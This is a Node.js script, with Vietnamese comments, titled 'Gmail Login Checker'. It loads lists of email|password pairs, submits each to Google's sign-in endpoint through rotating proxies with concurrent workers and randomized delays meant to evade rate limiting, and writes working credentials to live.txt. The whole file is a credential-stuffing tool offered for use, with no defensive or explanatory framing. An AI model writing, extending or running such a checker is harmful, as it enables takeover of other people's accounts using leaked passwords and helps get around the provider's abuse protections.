const axios = require('axios');
const chalk = require('chalk');
const async = require('async');
const fs = require('fs');
const readline = require('readline-sync');

const MAX_THREADS = 10; // Số luồng đồng thời (tăng nếu máy mạnh)
const TIMEOUT = 15000; // Timeout mỗi request (ms)
const DELAY = { min: 3000, max: 8000 }; // Delay giữa các request (ms)

let PROXIES = [];
let currentProxyIndex = 0;

// Load proxies từ file
function loadProxies() {
    try {
        const data = fs.readFileSync('proxies.txt', 'utf8');
        PROXIES = data.split('\n').map(line => line.trim()).filter(line => line && line.startsWith('http'));
        console.log(chalk.green(`Loaded ${PROXIES.length} proxies`));
    } catch (err) {
        console.log(chalk.yellow('No proxies.txt found - running without proxy'));
    }
}

function getNextProxy() {
    if (PROXIES.length === 0) return null;
    const proxy = PROXIES[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % PROXIES.length;
    return proxy;
}

// Check login Gmail
async function checkLogin(email, password) {
    const proxy = getNextProxy();
    const config = {
        timeout: TIMEOUT,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
    };

    if (proxy) {
        config.proxy = {
            protocol: 'http',
            host: proxy.split('@')[1]?.split(':')[0] || proxy.split('://')[1].split(':')[0],
            port: parseInt(proxy.split(':')[proxy.split(':').length - 1]),
            auth: proxy.includes('@') ? {
                username: proxy.split('://')[1].split(':')[0],
                password: proxy.split('@')[0].split('://')[1].split(':')[1]
            } : undefined
        };
    }

    try {
        const response = await axios.post('https://accounts.google.com/signin/v2/identifier', {
            Email: email,
            Passwd: password,
            continue: 'https://mail.google.com/mail/u/0/',
            service: 'mail',
            flowName: 'GlifWebSignIn',
            flowEntry: 'ServiceLogin',
        }, config);

        // Nếu login success → redirect hoặc status 200 + set-cookie
        if (response.status === 200 && response.headers['set-cookie']) {
            return { email, password, status: 'LIVE', message: 'Login success' };
        } else {
            return { email, password, status: 'DEAD', message: 'Invalid credentials' };
        }
    } catch (error) {
        const errMsg = error.response?.data || error.message;
        if (errMsg.includes('invalid') || errMsg.includes('incorrect')) {
            return { email, password, status: 'DEAD', message: 'Wrong password' };
        } else if (errMsg.includes('captcha')) {
            return { email, password, status: 'CAPTCHA', message: 'Require captcha' };
        } else {
            return { email, password, status: 'ERROR', message: errMsg.slice(0, 100) };
        }
    }
}

async function main() {
    console.log(chalk.bold.cyan('Gmail Login Checker v1.0'));
    console.log(chalk.gray('========================================'));

    loadProxies();

    const mode = readline.question(chalk.yellow('Mass check from file? (y/n): '));
    let accounts = [];

    if (mode.toLowerCase() === 'y') {
        const file = readline.question(chalk.yellow('Enter file path (accounts.txt): '));
        try {
            const data = fs.readFileSync(file, 'utf8');
            accounts = data.split('\n').map(line => line.trim()).filter(line => line && line.includes('|'));
            console.log(chalk.green(`Loaded ${accounts.length} accounts`));
        } catch (err) {
            console.log(chalk.red('File not found or error'));
            return;
        }
    } else {
        const line = readline.question(chalk.yellow('Enter email|password: '));
        accounts = [line];
    }

    console.log(chalk.blue(`\nStarting check with ${MAX_THREADS} threads...`));

    const live = [];
    const dead = [];
    const captcha = [];
    const error = [];

    const queue = async.queue(async (account, callback) => {
        const [email, password] = account.split('|');
        if (!email || !password) return callback();

        const result = await checkLogin(email, password);
        const color = result.status === 'LIVE' ? 'green' : result.status === 'DEAD' ? 'red' : result.status === 'CAPTCHA' ? 'yellow' : 'gray';

        console.log(chalk[color](`${email} → ${result.status} (${result.message})`));

        if (result.status === 'LIVE') {
            live.push(account);
            fs.appendFileSync('live.txt', account + '\n');
        } else if (result.status === 'DEAD') {
            dead.push(account);
            fs.appendFileSync('dead.txt', account + '\n');
        } else if (result.status === 'CAPTCHA') {
            captcha.push(account);
            fs.appendFileSync('captcha.txt', account + '\n');
        } else {
            error.push(account);
            fs.appendFileSync('error.txt', account + '\n');
        }

        // Delay random để tránh rate limit Google
        await new Promise(resolve => setTimeout(resolve, Math.random() * (DELAY.max - DELAY.min) + DELAY.min));

        callback();
    }, MAX_THREADS);

    queue.drain(() => {
        console.log(chalk.bold.green('\nDONE!'));
        console.log(chalk.green(`Live: ${live.length}`));
        console.log(chalk.red(`Dead: ${dead.length}`));
        console.log(chalk.yellow(`Captcha: ${captcha.length}`));
        console.log(chalk.gray(`Error: ${error.length}`));
    });

    queue.push(accounts);
}

main().catch(err => console.log(chalk.red('Fatal error:', err.message)));